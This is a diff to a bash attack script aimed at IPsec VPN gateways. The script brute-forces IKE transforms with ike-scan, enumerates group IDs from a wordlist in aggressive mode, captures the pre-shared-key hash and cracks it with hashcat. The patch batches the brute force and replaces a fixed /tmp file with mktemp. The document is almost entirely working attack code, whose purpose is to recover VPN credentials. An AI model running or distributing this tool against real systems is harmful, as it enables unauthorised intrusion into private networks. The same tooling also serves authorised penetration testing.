@@ -28,6 +28,13 @@ auth_code=0
 dh_group=-1
 sa_lifetime=-1
 
+PSK_FILE=""
+
+cleanup () {
+    [[ -n "$PSK_FILE" && -f "$PSK_FILE" ]] && rm -f "$PSK_FILE"
+}
+trap cleanup EXIT
+
 show_title () {
     cat << 'EOF'
 o 8                  .oo 8
@@ -79,6 +86,14 @@ help_wanted () {
     return $stat
 }
 
+require_value () {
+    # $1 = option name, $2 = the value that follows it
+    if [[ -z "$2" || "$2" == -* ]]; then
+        echo "Option $1 requires an argument"
+        exit 1
+    fi
+}
+
 parse_parameters () {
     while [[ $# -gt 0 ]]; do
         case "$1" in
@@ -87,22 +102,27 @@ parse_parameters () {
                 exit
                 ;;
             -t|--target)
+                require_value "$1" "$2"
                 shift
                 target=$1
                 ;;
             -iw|--id_wordlist)
+                require_value "$1" "$2"
                 shift
                 id_wordlist=$1
                 ;;
             -pw|--pwd_wordlist)
+                require_value "$1" "$2"
                 shift
                 password_wordlist=$1
                 ;;
             -id|--group_id)
+                require_value "$1" "$2"
                 shift
                 group_id=$1
                 ;;
             -p|--port)
+                require_value "$1" "$2"
                 shift
                 port=$1
                 ;;
@@ -110,6 +130,7 @@ parse_parameters () {
                 vendor_info=1
                 ;;
             -o|--output)
+                require_value "$1" "$2"
                 shift
                 output_file=$1
                 ;;
@@ -131,12 +152,12 @@ check_port () {
 
     if [[ -n "$port" ]]; then
         result=$(nmap -sU -p "$port" --open -oG - "$target" 2>&1)
-        if echo "$result" | grep -q "$port/open" && ike-scan -M "$target":"$port" 2>&1 | grep -q "returned handshake"; then
+        if echo "$result" | grep -qE "(^|[^0-9])$port/open" && ike-scan -M "$target":"$port" 2>&1 | grep -q "returned handshake"; then
             networklevel_check=1
         fi
     else
         result=$(nmap -sU -p 500,4500 --open -oG - "$target" 2>&1)
-        if echo "$result" | grep -qE "500/open|4500/open"; then
+        if echo "$result" | grep -qE "(^|[^0-9])(500|4500)/open"; then
             networklevel_check=1
         fi
     fi
@@ -193,6 +214,19 @@ parse_transformation () {
     report "[TRANS] Enc=$enc_algor Hash=$hash_algor Auth=$auth_method Group=$dh_group Life=$sa_lifetime -> ${enc_code},${hash_code},${auth_code},${dh_group}"
 }
 
+isolate_transformation () {
+    local single
+    for single in "$@"; do
+        local out
+        out=$(ike-scan -M -v "$single" "$target" 2>&1)
+        if echo "$out" | grep -q "1 returned handshake"; then
+            echo "$out"
+            return 0
+        fi
+    done
+    return 1
+}
+
 transformation_finder () {
     local result=$(ike-scan -M -v "$target" 2>&1)
 
@@ -205,28 +239,33 @@ transformation_finder () {
     elif echo "$result" | grep -qE "1 returned notify"; then
         echo -e "${WHITE}[*] No Handshake received using default payload, trying with bruteforce${RESET}"
 
-        dict="/tmp/ike-dict.txt"
-        > "$dict"
+        local batch=()
+        local BATCH_SIZE=16
+        local found=""
+
         for ENC in 1 2 3 4 5 6 7/128 7/192 7/256 8; do
             for HASH in 1 2 3 4 5 6; do
                 for AUTH in 1 2 3 4 5 6 7 8 64221 64222 64223 64224 65001 65002 65003 65004 65005 65006 65007 65008 65009 65010; do
                     for GROUP in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18; do
-                        echo "--trans=${ENC},${HASH},${AUTH},${GROUP}" >> "$dict"
+                        batch+=("--trans=${ENC},${HASH},${AUTH},${GROUP}")
+
+                        if (( ${#batch[@]} >= BATCH_SIZE )); then
+                            if ike-scan -M "${batch[@]}" "$target" 2>&1 | grep -q "1 returned handshake"; then
+                                found=$(isolate_transformation "${batch[@]}")
+                                break 4
+                            fi
+                            batch=()
+                        fi
                     done
                 done
             done
         done
 
-        found=""
-        while read -r line; do
-            if ike-scan -M "$line" "$target" 2>&1 | grep -q "1 returned handshake"; then
-                echo -e "${GREEN}[+] Valid trans found: $line${RESET}"
-                found=$(ike-scan -M -v "$line" "$target" 2>&1)
-                break
+        if [[ -z "$found" && ${#batch[@]} -gt 0 ]]; then
+            if ike-scan -M "${batch[@]}" "$target" 2>&1 | grep -q "1 returned handshake"; then
+                found=$(isolate_transformation "${batch[@]}")
             fi
-        done < "$dict"
-
-        rm -f "$dict"
+        fi
 
         if [[ -z "$found" ]]; then
             echo -e "${RED}[!] No valid transformation found after bruteforce. Stopping.${RESET}"
@@ -262,15 +301,18 @@ id_finder () {
     local found_id=""
 
     while read -r gid; do
-        if ike-scan -M --aggressive --trans="$trans" --id="$gid" -P/tmp/psk.txt "$target" 2>&1 \
+        if ike-scan -M --aggressive --trans="$trans" --id="$gid" --pskcrack="$PSK_FILE" "$target" 2>&1 \
             | grep -q "1 returned handshake"; then
             echo -e "${GREEN}[+] Valid group ID found: $gid${RESET}"
             found_id="$gid"
+            group_id="$found_id"
             break
         fi
     done < "$id_wordlist"
 
     [[ -z "$found_id" ]] && { echo -e "${RED}[!] No valid ID found${RESET}"; exit 1; }
+
+    extract_psk_with_id "$found_id"
 }
 
 crack_psk () {
@@ -286,20 +328,20 @@ crack_psk () {
             ;;
     esac
 
-    if [[ ! -s /tmp/psk.txt ]]; then
+    if [[ ! -s "$PSK_FILE" ]]; then
         echo -e "${RED}[!] No PSK hash captured, nothing to crack${RESET}"
         exit 1
     fi
 
-    cp /tmp/psk.txt ./ike_psk.hash
+    cp "$PSK_FILE" ./ike_psk.hash
     echo -e "${WHITE}[*] Hash saved to ./ike_psk.hash (resume with: hashcat -m $mode ike_psk.hash $password_wordlist)${RESET}"
 
     echo -e "${WHITE}[*] Running hashcat (mode $mode), please wait...${RESET}"
 
-    hashcat -m "$mode" -a 0 --quiet /tmp/psk.txt "$password_wordlist" >/dev/null 2>&1
+    hashcat -m "$mode" -a 0 --quiet "$PSK_FILE" "$password_wordlist" >/dev/null 2>&1
 
     local cracked
-    cracked=$(hashcat -m "$mode" /tmp/psk.txt --show 2>/dev/null | awk -F: '{print $NF}')
+    cracked=$(hashcat -m "$mode" "$PSK_FILE" --show 2>/dev/null | awk -F: '{print $NF}')
 
     if [[ -n "$cracked" ]]; then
         echo -e "${GREEN}[+] PSK recovered: ${cracked}${RESET}"
@@ -307,26 +349,26 @@ crack_psk () {
     else
         echo -e "${RED}[!] PSK not found in the given wordlist${RESET}"
     fi
-
-    rm -f /tmp/psk.txt
 }
 
 extract_psk_with_id () {
     local gid="$1"
     local trans="${enc_code},${hash_code},${auth_code},${dh_group}"
     echo -e "${WHITE}[*] Requesting aggressive mode handshake with ID '$gid'...${RESET}"
-    ike-scan -M -A --trans="$trans" --id="$gid" --pskcrack=/tmp/psk.txt "$target" 2>&1
+    ike-scan -M -A --trans="$trans" --id="$gid" --pskcrack="$PSK_FILE" "$target" 2>&1
 
-    if [[ ! -s /tmp/psk.txt ]]; then
+    if [[ ! -s "$PSK_FILE" ]]; then
         echo -e "${RED}[!] No PSK hash captured with the given ID${RESET}"
         exit 1
     fi
-    echo -e "${GREEN}[+] PSK hash saved to /tmp/psk.txt${RESET}"
+    echo -e "${GREEN}[+] PSK hash saved to $PSK_FILE${RESET}"
 }
 
 main () {
     show_title
     parse_parameters "$@"
+
+    PSK_FILE=$(mktemp /tmp/psk.XXXXXX)
 
     if [[ -n "$output_file" ]]; then
         > "$output_file"
